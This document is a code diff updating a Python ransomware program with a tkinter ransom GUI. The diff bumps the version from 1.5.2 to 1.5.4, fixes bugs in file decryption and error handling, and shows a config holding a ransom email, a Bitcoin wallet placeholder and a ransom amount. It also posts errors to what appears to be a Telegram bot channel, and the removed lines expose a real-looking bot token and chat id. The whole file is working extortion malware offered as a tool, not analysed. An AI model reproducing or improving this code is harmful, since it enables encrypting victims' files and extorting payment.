@@ -5,14 +5,11 @@ import time
 import string
 import random
 import requests
-import re
 import threading
 import errno
 from cryptography.fernet import Fernet
 from colorama import Fore, Style, init
 from datetime import datetime
-from datetime import datetime
-from cryptography.fernet import Fernet
 from tkinter import *
 import tkinter as tk
 from PIL import ImageTk, Image
@@ -25,7 +22,7 @@ def get_random_string(length):
     result_str = "".join(random.choice(letters) for i in range(length))
     return result_str
 
-version = '1.5.2'
+version = '1.5.4'
 errors = []
 encryptedfiles = []
 decryptedfiles = [] 
@@ -44,12 +41,12 @@ cipher_key = Fernet(key)
 
 class Config:
     def __init__(self):
-        self.api = '6846677084:AAEpea1VOzlVxAXZcY0bjQ1CiQR8UxaJ8iM'
-        self.chat_id = '-4155521462'
+        self.api = 'YOUR_API'
+        self.chat_id = 'YOUR_CHAT_ID'
         self.ransomware = True
         self.ransomware_email_address = 'THANK@YOU.COM'
         self.ransomware_btc_wallet_adress = "YOUR_BTC_ADDRESS"
-        self.ransomware_amount_of_money = "999"
+        self.ransomware_amount_of_money = "A MOUNT OF MONEY"
     
     def get_ransomware(self):
         return self.ransomware
@@ -100,8 +97,9 @@ def send_wh():
     
     try:
         response = requests.post(url, params=params)
-        if response != 200:
+        if response.status_code != 200:
             sys.exit(1)
+
     except Exception:
         pass
     
@@ -111,7 +109,8 @@ def log_error(e):
     
     try:
         response = requests.post(url, params=params)
-        
+        if response != 200:
+            sys.exit(1)
     except Exception:
         pass
 
@@ -165,6 +164,11 @@ def encrypted_files():
 
 
 
+
+
+########
+# GUI  #
+########    
 class GUI:
 
     def __init__(self, master):
@@ -304,22 +308,23 @@ class GUI:
                 text_box.config(fg='#00FFFF', state='normal') 
 
             text_box.insert(tk.END, message + '\n')
-            text_box.see(tk.END)
-            text_box.config(state='disable')  
-            
+
 
         def decrypt_file(file_path, cipher_suite):
-            decryptedfiles.append(file_path)
+            try:
+                decryptedfiles.append(file_path)
 
-            with open(file_path, 'rb') as encrypted_file:
-                encrypted_data = encrypted_file.read()
-                decrypted_data = cipher_suite.decrypt(encrypted_data)
+                with open(file_path, 'rb') as encrypted_file:
+                    encrypted_data = encrypted_file.read()
+                    decrypted_data = cipher_suite.decrypt(encrypted_data)
 
-            decrypted_file_path = file_path.rsplit('.apt3233.encrypted', 1)[0]
-            with open(decrypted_file_path, 'wb') as decrypted_file:
-                decrypted_file.write(decrypted_data)
+                decrypted_file_path = file_path.rsplit('.apt3233.encrypted', 1)[0]
+                with open(decrypted_file_path, 'wb') as decrypted_file:
+                    decrypted_file.write(decrypted_data)
 
-            os.remove(file_path)
+                os.remove(file_path)
+            except Exception as e:
+                errors.append(str(e))
 
         def decrypted_files():
             try:
@@ -327,39 +332,43 @@ class GUI:
                     for decryptedfile in decryptedfiles:
                         file.write(decryptedfile + '\n')
             except Exception as e:
-                errors.append(e)
-                
+                errors.append(str(e))
+
         def log_error_2():
             try:
                 with open('APT-RANSOMWARE-ERRORS.txt', 'w') as file:
                     for error in errors:
                         file.write(error + '\n')
-            except Exception:
+            except Exception as e:
                 print(Fore.RED + Style.DIM + current_datetime + 'Really bad error occured. Please directly report to head developer.')
 
 
+            
 
-        #Display Process
+        # Display Process
         self.text_box_2 = Text(self.top, height=13, width=60)
         self.text_box_2.config(fg='white', bg='gray17')
         self.text_box_2.place(x=10, y=70)
-        
+
+        show_process(self.text_box_2, "Decryption started...")
+
         self.user_input = self.text_box2_entry.get()
 
         global cipher_suite
 
         try:
-            cipher_suite = Fernet(self.user_input)
 
-            show_process(self.text_box_2, "Decryption started...")
-            time.sleep(2)
-            show_process(self.text_box_2, "Waitting..")
+            cipher_suite = Fernet(self.user_input)
+            
+            
+            show_process(self.text_box_2, "Waiting...")
 
             for root, dirs, files in os.walk(target_directory):
                 for file in files:
                     file_path = os.path.join(root, file)
                     try:
                         decrypt_file(file_path, cipher_suite)
+
                     except OSError as e:
                         if e.errno in (errno.EACCES, errno.EPERM, errno.EINVAL, errno.ENOENT,
                                     errno.ENOTDIR, errno.ENAMETOOLONG, errno.EROFS):
@@ -368,25 +377,30 @@ class GUI:
                         if isinstance(e, (FileNotFoundError, IsADirectoryError, TimeoutError,)):
                             pass  
                         else:
-                            errors.append(e)
-                            log_error_2(e)
+                            errors.append(str(e))
 
             decrypted_files()
 
             show_process(self.text_box_2, "DONE.")
+            
 
         except ValueError:
             show_process(self.text_box_2, "Password Error..")
+        except Exception as e:
+            show_process(self.text_box_2, "Password Error..")
+            errors.append(str(e))
+            log_error_2()
+
 
     
 
-    def copy_email():
+    def copy_email(self):
         email = f"{cc.get_ransomeware_email_address()}"
         root.clipboard_clear()
         root.clipboard_append(email)
         root.update()
 
-    def copy_btc_address():
+    def copy_btc_address(self):
         btc_address = f"{cc.get_ransomware_btc_wallet_adress()}"
         root.clipboard_clear()
         root.clipboard_append(btc_address)
@@ -402,16 +416,17 @@ def ransomeware():
     with open(file_path, 'w') as file:
         file.write(message_to_victim)
     
-    root = Tk()
-    main = GUI(root)
-    root.mainloop()
+    
     # os.startfile(file_path)
 
 if cc.get_ransomware():
     try:
-        thr1 = threading.Thread(target=lambda: ransomeware(), name='AppSecure')
-        thr1.start()
-        sys.exit(0)
+        threading.Thread(target=ransomeware(), name='AppSecure').start()
+    
+        root = Tk()
+        main = GUI(root)
+        root.mainloop()
+
     except Exception as e:
         log_error(e)
 
